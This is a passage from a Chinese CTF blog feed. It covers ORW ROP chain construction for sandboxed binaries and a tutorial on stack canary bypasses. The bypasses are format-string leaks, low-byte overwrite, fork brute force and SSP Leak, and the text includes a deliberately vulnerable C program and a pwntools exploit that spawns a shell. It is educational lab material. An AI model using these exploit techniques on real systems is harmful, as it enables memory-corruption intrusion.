<code>back_addr</code> 设置为让我们输入构造 ROP 的地方，这样就可以连续输入 3 次，将 ORW 连续 3 次分别写入并执行</em></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># fd = fopen('/flag', 'r') </span>ORW1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>fopen_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_addr<span class="token punctuation">)</span><span class="token comment"># read(3, write_flag_addr, 0x50)</span>ORW2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>back_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment"># write(1, write_flag_addr, 0x50)</span>ORW3 <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="64-位-ORW-构造-1"><a href="#64-位-ORW-构造-1" class="headerlink" title="64 位 ORW 构造"></a>64 位 ORW 构造</h3><blockquote><p>注意：64 位程序传参需要借助寄存器</p><p><em>因此程序中具体存在什么样的 gadget 需要具体分析，ORW 构造也会相应地修改，但只要保证我们能够将对应的值传入对应的寄存器中即可</em></p><p><strong>如果没有合适的 gadget 利用，可以尝试 Ret2csu</strong></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># open(b'/flag\x00\x00', 0)</span>ORW <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open64_plt_addr<span class="token punctuation">)</span><span class="token comment"># read(3, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span><span class="token comment"># write(1, name_addr, 0x50)</span>ORW <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">沙箱技术是一种为执行中的程序提供隔离环境的安全机制，但与虚拟机有所区别，在沙箱环境下通常会限制一些系统调用，虽然 ORW 无法获取 shell，但可以实现任意地址读和任意地址写</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="ORW" scheme="https://www.uf4te.cn/tags/ORW/"/>
    
    <category term="沙箱绕过" scheme="https://www.uf4te.cn/tags/%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>Bypass安全机制</title>
    <link href="https://www.uf4te.cn/posts/c695aa69.html"/>
    <id>https://www.uf4te.cn/posts/c695aa69.html</id>
    <published>2024-05-12T02:05:35.000Z</published>
    <updated>2024-06-05T06:37:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Canary-Bypass"><a href="#Canary-Bypass" class="headerlink" title="Canary Bypass"></a>Canary Bypass</h1><blockquote><p>本节主要汇总了常用的绕过 Canary 的方法</p><p>参考文章：<a href="https://www.anquanke.com/post/id/262846#h2-16">绕过canary保护的6种方法-安全客 - 安全资讯平台</a></p></blockquote><hr><h2 id="什么是-Canary？"><a href="#什么是-Canary？" class="headerlink" title="什么是 Canary？"></a>什么是 Canary？</h2><blockquote><p>Canary 又叫金丝雀，是一种针对栈溢出的保护机制，它在程序的函数入口处从 GS 段（32 位）或 FS 段（64 位）内获取一个随机值，<strong>每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的</strong></p><p>如果我们想利用栈溢出覆盖返回值，则填充的数据必定会经过栈上的 Canary，如果程序检测到 Canary 的值被修改，程序便会执行 <code>__stack_chk_fail</code> 函数，导致程序发生崩溃，我们也就无法利用栈溢出漏洞了</p><p>触发 Canary 保护时，程序会输出：<code>*** stack smashing detected ***: terminated</code></p><p>注意：<mark>子进程由于触发 Canary 崩溃不会导致父进程退出</mark>，这为我们 Bypass Canary 提供了更多的可能</p></blockquote><p>GCC 编译时设置 Canary 保护的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-fstack-protector   <span class="token comment"># 启用保护，不过只为局部变量中含有 char 数组的函数插入保护</span>-fstack-protector-all   <span class="token comment"># 启用保护，为所有函数插入保护</span>-fstack-protector-strong-fstack-protector-explicit   <span class="token comment"># 只对有明确 stack_protect attribute 的函数开启保护</span>-fno-stack-protector   <span class="token comment"># 禁用保护</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 IDA 中，Canary 一般以如下形式出现：</p><ul><li>64 位程序</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypass安全机制13.png"></p><ul><li>32 位程序</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">v2 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B614.png" alt="CTF-PWN_Bypass安全机制14.png"></p><p>在 64 位程序中，通常 Canary 在栈中是位于 RBP 上方的 8 字节（与 RBP 相邻），<strong>但是 Canary 的位置不一定总是与 RBP 相邻，具体得看编译器的操作</strong></p><p>以一个 64 位程序的例子来说明：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B61.png" alt="CTF-PWN_Bypass安全机制1.png"></p><p>可以看到 <code>v2</code> 位于 <code>rbp - 8h</code> 的地方，正好在 RBP 上方的 8 字节（与 RBP 相邻）</p><p>在栈中的样子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B62.png" alt="CTF-PWN_Bypass安全机制2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B65.png" alt="CTF-PWN_Bypass安全机制5.png"></p><p>但 Canary 的位置也不是绝对的，需要具体情况具体分析</p><p>例如下面这个 32 位程序的例子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B63.png" alt="CTF-PWN_Bypass安全机制3.png"></p><p>可以看到 <code>v7</code> 位于 <code>ebp - Ch</code> 的地方，而不是 EBP 上方的 4 字节（与 EBP 不相邻）</p><p>在栈中的样子：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B64.png" alt="CTF-PWN_Bypass安全机制4.png"></p><p>这里的 Canary 在栈中位于 EBP 上方的第 <code>(0xC - 0x0) / 4 = 3</code> 个位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B66.png" alt="CTF-PWN_Bypass安全机制6.png"></p><blockquote><p>Canary 一般有如下特点：</p><ol><li>十六进制通常以 <code>&#39;\x00&#39;</code> 结尾，例如：<code>0x29a30f00</code>，在内存中其实是 <code>0x00 0x0f 0xa3 0x29</code>，这样是为了与 Canary 前面的内容截断。也就是说在不溢出的情况下，我们无法通过 <code>printf()</code> 之类的函数将 Canary 打印出来，因为这些函数在遇到 Canary 第一字节的 <code>0x00</code> 就被截断了  </li><li>每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的，<em>也就意味着，在同一次程序的运行中，所有的 Canary 的值都是相同的</em></li></ol></blockquote><hr><h2 id="格式化字符串泄露-Canary"><a href="#格式化字符串泄露-Canary" class="headerlink" title="格式化字符串泄露 Canary"></a>格式化字符串泄露 Canary</h2><blockquote><p>如果存在格式化字符串漏洞，那么 Canary 保护基本等同于虚设，因为我们可以直接泄露出 Canary</p></blockquote><p>这种 Bypass 方法重点在于确定 Canary 在栈中的位置，泄露比较简单，因此不做过多解释</p><p>具体如何泄露，可以查看本站《<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">格式化字符串漏洞与利用</a>》这篇文章</p><hr><h2 id="覆盖低字节输出-Canary"><a href="#覆盖低字节输出-Canary" class="headerlink" title="覆盖低字节输出 Canary"></a>覆盖低字节输出 Canary</h2><blockquote><p>前面提到 Canary 的十六进制数值通常以 <code>&#39;\x00&#39;</code> 结尾，而在内存中是小端序储存，例如：<code>0x29a30f00</code>，在内存中其实是 <code>0x00 0x0f 0xa3 0x29</code>，这样是为了让 <code>&#39;\x00&#39;</code> 截断 Canary 前面的数据，防止将 Canary 打印出来</p><p>那么同样的思路，<strong>如果我们能够覆盖 Canary 低字节的 <code>&#39;\x00&#39;</code>，就可以直接将 Canary 输出了</strong></p></blockquote><p>以一个例子说明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Weclome to uf4te!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// gcc -m32 -no-pie -g -o test test.c</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后保护机制如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B67.png" alt="CTF-PWN_Bypass安全机制7.png"></p><p>调试我们发现，Canary 在栈中的 EBP 上方第三个位置，Canary 下方相邻处有一条即将被 <code>puts(&quot;Weclome to uf4te!&quot;);</code> 输出的内容</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B68.png" alt="CTF-PWN_Bypass安全机制8.png"></p><p>计算一下我们输入的位置与他们的偏移，可以看到输入的起始地址在 <code>0xffffcd68</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B69.png" alt="CTF-PWN_Bypass安全机制9.png"></p><p>与 Canary 距离 100 字节：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B610.png" alt="CTF-PWN_Bypass安全机制10.png"></p><p>因此第一次 <code>read(0, buf, 0x200);</code> 我们发送的 payload 为：<code>payload = b&#39;a&#39; * 100</code>，这样就刚好覆盖到 Canary 的上一个数据，然后我们用 <code>io.sendline(payload)</code> 来发送 payload</p><p>因为 <code>io.sendline()</code> 会在 payload 的结尾添加一个回车符，即：<code>&#39;0x0a&#39;</code>，相当于我们总共发送了 101 个字节，前 100 个字节到达 Canary 的位置，最后一个 <code>&#39;0x0a&#39;</code> 覆盖 Canary 的最低一字节</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B611.png" alt="CTF-PWN_Bypass安全机制11.png"></p><p>可以看到此时 Canary 的最低一字节不再是 <code>&#39;\x00&#39;</code> 而是 <code>&#39;\x0a&#39;</code></p><p>然后继续执行到 <code>printf(buf);</code> 的地方</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B612.png" alt="CTF-PWN_Bypass安全机制12.png"></p><p>可以看到除了我们输入的 <code>&#39;a&#39;</code> 和 <code>&#39;\x0a&#39;</code> 外，程序还输出了一些别的数据，<code>&#39;\x0a&#39;</code> 以及其后的 3 字节：<code>0x0a 0x91 0x67 0x54</code> 就是修改后的 Canary 的值了</p><p>我们用泄露出的地址减去 <code>0x0a</code> 就是真正的 Canary 的值</p><p>由于在同一次运行中，Canary 的值是不会变的，因此第二次 <code>read(0, buf, 0x200);</code> 我们在覆盖时要用泄露出的 Canary 替换，保证不覆盖 Canary 的值</p><p>因此 exp 如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>getshell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"getshell"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>Canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment"># 为了泄露出 Canary，其最低位被我们修改为 '\x0a'，因此减去 0xa 后才是真正的 Canary 的值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Canary -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>Canary<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>Canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">12</span>   <span class="token comment"># 填充 Canary 后距离返回地址还差 12 字节，因此再填充 b'a' * 12</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>getshell_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="one-by-one-逐字节爆破-Canary"><a href="#one-by-one-逐字节爆破-Canary" class="headerlink" title="one-by-one 逐字节爆破 Canary"></a>one-by-one 逐字节爆破 Canary</h2><blockquote><p>虽然每次进程重启的 Canary 都不同，但是同一个进程中的不同线程的 Canary 是相同的，并且<strong>通过 fork 函数创建的子进程的 Canary 也是相同的</strong>，同时 <em>Canary 的最低一字节为 <code>&#39;\x00&#39;</code> 是不会变的</em>，因此，我们可以考虑对 Canary 进行爆破</p></blockquote><p>以 64 位程序为例，64 位程序的 Canary 一般为 8 字节，同时最低一字节为 <code>&#39;\x00&#39;</code></p><p>因此相当于需要爆破高位的 7 字节，每一字节的取值范围在 <code>0 ~ 255</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CISCN2023-funcanary2.png" alt="CISCN2023-funcanary2.png"></p><p>例如上图中，通过 <code>fork()</code> 函数产生的 canary 金丝雀的值是固定不变的</p><blockquote><p>注意：</p><p>一般情况下，我们爆破 Canary 的过程中如果出现错误，就会导致程序崩溃，因此通常是不可行的</p><p>但是这里是通过 <code>fork()</code> 函数生成了子线程，<strong>子进程崩溃不会导致父进程退出</strong>，因此可以爆破</p></blockquote><p>具体例题见本站的《<a href="%E3%80%90CISCN%202023%E3%80%91funcanary.md">【CISCN 2023】funcanary</a>》</p><hr><h2 id="SSP-Leak-绕过-Canary"><a href="#SSP-Leak-绕过-Canary" class="headerlink" title="SSP Leak 绕过 Canary"></a>SSP Leak 绕过 Canary</h2><blockquote><p>全称是 Stack Smashing Protect Leak，其实就是利用了我们前面提到的触发 Canary 后会输出：<code>*** stack smashing detected ***: terminated</code>，通过故意触发 Canary 保护并修改要输出的变量 <code>__libc_argv[0]</code> 的地址来实现任意地址读取</p><p><em>这个问题依赖于 Glibc 的版本，在 Ubuntu 22.04 的 Glibc 2.35 中已经修复，如果想在本地复现就需要更换 Glibc 版本，Glibc 2.26 以后所有修改，目前已知 Glibc 2.25 及以下版本都未修复该漏洞</em> </p><p><mark>注意：SSP Leak 只能泄露内存中的数据，但无法获得 shell</mark></p></blockquote><p>首先分析一下触发 Canary 后执行的 <code>__stack_chk_fail</code> 函数</p><p>由于这个函数是 Glibc 中的，想查看需要下载 Glibc 源码，下载地址：<a href="https://ftp.gnu.org/gnu/glibc/">Index of &#x2F;gnu&#x2F;glibc</a></p><p>先来看看旧的版本 Glibc 2.19 中的实现</p><p>在 <code>./debug/stack_chk_fail.c</code> 下找到 <code>__stack_chk_fail</code> 函数的源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>./debug/fortify_fail.c</code> 下找到 <code>__fortify_fail</code> 函数的源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.19/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>     <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">;</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑很清晰，<code>__stack_chk_fail</code> 函数会调用 <code>__fortify_fail</code> 函数输出刚刚的 <code>*** stack smashing detected ***: terminated</code> 信息</p><p>但是细心一点会发现，这里存在两个 <code>&#39;%s&#39;</code>，后面还有个 <code>__libc_argv[0]</code> 参数，因此<em>实际上是输出了 <code>msg</code> 和 <code>__libc_argv[0]</code> 两个参数的内容</em></p><blockquote><p><code>msg</code> 是固定的 <code>&quot;stack smashing detected&quot;</code>，<code>__libc_argv[0]</code> 默认为程序名</p></blockquote><p>因此，如果我们能修改 <code>__libc_argv[0]</code> 的值为某个地址，就可以将该地址上的信息在 <code>&quot;*** %s ***: %s terminated\n&quot;</code> 中输出出来</p><p>从 Glibc 2.26 开始，增加了一个 <code>need_backtrace</code> 变量来控制输出的信息，这时 <code>__libc_argv[0]</code> 默认为 <code>&lt;unknown&gt;</code>，源码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.26/debug/fortify_fail.c</span><span class="token macro property"><span 